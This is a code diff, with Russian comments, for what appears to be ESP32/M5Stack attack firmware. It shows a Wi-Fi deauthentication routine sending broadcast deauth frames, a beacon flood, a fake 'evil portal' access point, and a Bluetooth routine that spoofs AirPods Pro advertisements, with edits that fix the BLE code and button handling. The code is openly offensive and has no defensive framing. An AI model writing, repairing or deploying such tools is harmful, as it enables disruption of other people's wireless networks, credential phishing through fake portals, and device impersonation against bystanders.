@@ -27,7 +27,7 @@ void evil_portal();
 void ble_spoof_airpods();
 void showMenu(WiFiClient &client);
 
-// ========== DEAUTH (рабочий) ==========
+// ========== DEAUTH ==========
 void deauth_attack() {
   esp_wifi_set_promiscuous(true);
   esp_wifi_set_channel(deauth_channel, WIFI_SECOND_CHAN_NONE);
@@ -39,7 +39,6 @@ void deauth_attack() {
   };
   uint8_t broadcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
   memcpy(&deauth_frame[4], broadcast, 6);
-  // В реальности нужно подставить свой MAC, но для демонстрации оставим так
   
   M5.Lcd.printf("[Deauth] Отправка %d пакетов на канале %d\n", deauth_count, deauth_channel);
   for (int i = 0; i < deauth_count; i++) {
@@ -50,7 +49,7 @@ void deauth_attack() {
   M5.Lcd.println("[Deauth] Завершён");
 }
 
-// ========== BEACON FLOOD (рабочий) ==========
+// ========== BEACON FLOOD ==========
 void beacon_flood() {
   esp_wifi_set_promiscuous(true);
   esp_wifi_set_channel(1, WIFI_SECOND_CHAN_NONE);
@@ -91,18 +90,20 @@ void evil_portal() {
   M5.Lcd.printf("[Portal] Запущен на %s\n", WiFi.softAPIP().toString().c_str());
 }
 
-// ========== BLE SPOOF ==========
+// ========== BLE SPOOF (исправлен) ==========
 void ble_spoof_airpods() {
   BLEDevice::init("AirPods Pro");
   BLEAdvertising *pAdvertising = BLEDevice::getAdvertising();
   BLEAdvertisementData data;
   data.setName("AirPods Pro");
   uint8_t appleData[] = {0x4c, 0x00, 0x12, 0x19, 0x00, 0x00, 0x00, 0x00};
-  data.setManufacturerData(std::string((char*)appleData, sizeof(appleData)));
+  // Исправление: преобразуем в String
+  data.setManufacturerData(String((char*)appleData, sizeof(appleData)));
   pAdvertising->setAdvertisementData(data);
   pAdvertising->start();
-  M5.Lcd.println("[BLE] AirPods Spoof активен (нажмите кнопку для остановки)");
-  while (!M5.BtnA.wasPressed() && !M5.BtnB.wasPressed() && !M5.BtnC.wasPressed()) {
+  M5.Lcd.println("[BLE] AirPods Spoof активен (нажмите A или B для остановки)");
+  // Ждём нажатия A или B (BtnC нет на Plus2)
+  while (!M5.BtnA.wasPressed() && !M5.BtnB.wasPressed()) {
     M5.update();
     delay(100);
   }
